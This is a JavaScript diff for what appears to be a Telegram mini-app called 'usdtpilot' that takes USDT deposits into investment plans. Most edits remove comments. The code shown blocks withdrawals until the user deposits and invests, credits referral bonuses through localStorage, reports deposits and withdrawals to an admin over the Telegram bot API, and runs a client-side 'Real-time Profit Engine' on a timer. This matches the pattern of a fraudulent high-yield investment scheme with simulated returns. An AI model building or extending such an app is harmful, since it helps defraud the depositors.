@@ -568,7 +568,6 @@
             telegramUser = tg.initDataUnsafe.user;
         }
 
-        // Check for start_param referral link parsing (e.g. ?start=ref_5738022147)
         if (tg?.initDataUnsafe?.start_param) {
             const startParam = tg.initDataUnsafe.start_param;
             if (startParam.startsWith('ref_')) {
@@ -597,7 +596,6 @@
         }
     }
 
-    /* CONDITIONAL WITHDRAWAL ACCESS CHECKER */
     function checkWithdrawAccess() {
         if (userState.activeInvestment === 0 && userState.totalDeposited === 0) {
             showToast("Please make a deposit and start an investment plan first!");
@@ -621,7 +619,6 @@
         openPage('withdraw');
     }
 
-    /* ADMIN VERIFICATION & DASHBOARD ENGINE */
     function checkAdminAccess() {
         if (telegramUser.id.toString() === ADMIN_CHAT_ID) {
             const nav = document.getElementById('main-nav');
@@ -676,11 +673,9 @@
                 userState.balance += tx.amount;
                 userState.totalDeposited += tx.amount;
 
-                // AUTOMATIC REFERRAL BONUS TRIGGER (1 USDT)
                 if (!userState.hasDeposited) {
                     userState.hasDeposited = true;
                     if (userState.referrerId) {
-                        // Simulate adding 1 USDT bonus to referrer via storage/bot notification
                         let refKey = `usdtpilot_userState_${userState.referrerId}`;
                         let referrerState = JSON.parse(localStorage.getItem(refKey)) || {
                             balance: 0, referralCount: 0, transactions: []
@@ -699,7 +694,6 @@
                         });
                         localStorage.setItem(refKey, JSON.stringify(referrerState));
 
-                        // Notify admin via bot message about referral reward payout
                         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
@@ -780,7 +774,7 @@
         `).join('');
     }
 
-    // Submit Deposit
+    // Submit Deposit (Sends Telegram Message to Admin)
     function submitDeposit() {
         const amt = parseFloat(document.getElementById('deposit-amount').value);
         const txid = document.getElementById('deposit-txid').value;
@@ -837,7 +831,7 @@
         openPage('history');
     }
 
-    // Submit Withdraw
+    // Submit Withdraw (Sends Telegram Message to Admin)
     function submitWithdraw() {
         const amt = parseFloat(document.getElementById('withdraw-amount').value);
         const addr = document.getElementById('withdraw-address').value;
@@ -897,7 +891,6 @@
         openPage('history');
     }
 
-    // Invest Action
     function invest(amount, dailyRate) {
         if (userState.balance < amount) {
             showToast("Insufficient Balance! Please deposit first.");
@@ -936,7 +929,6 @@
         showToast(`Successfully invested $${amount}!`);
     }
 
-    // Filter History
     function filterHistory(type, btn) {
         activeHistoryFilter = type;
         document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
@@ -944,7 +936,6 @@
         renderHistory();
     }
 
-    // Render History UI
     function renderHistory() {
         const container = document.getElementById('history-container');
         let filtered = userState.transactions;
@@ -997,7 +988,6 @@
         }).join('');
     }
 
-    // Update Stats
     function updateStats() {
         document.getElementById('stat-deposits').innerText = `$${userState.totalDeposited.toFixed(2)}`;
         document.getElementById('stat-withdraws').innerText = `$${userState.totalWithdrawn.toFixed(2)}`;
@@ -1014,7 +1004,6 @@
         document.getElementById('goal-percent').innerText = `${progress}%`;
     }
 
-    // Real-time Profit Engine
     function startProfitEngine() {
         setInterval(() => {
             const now = Date.now();
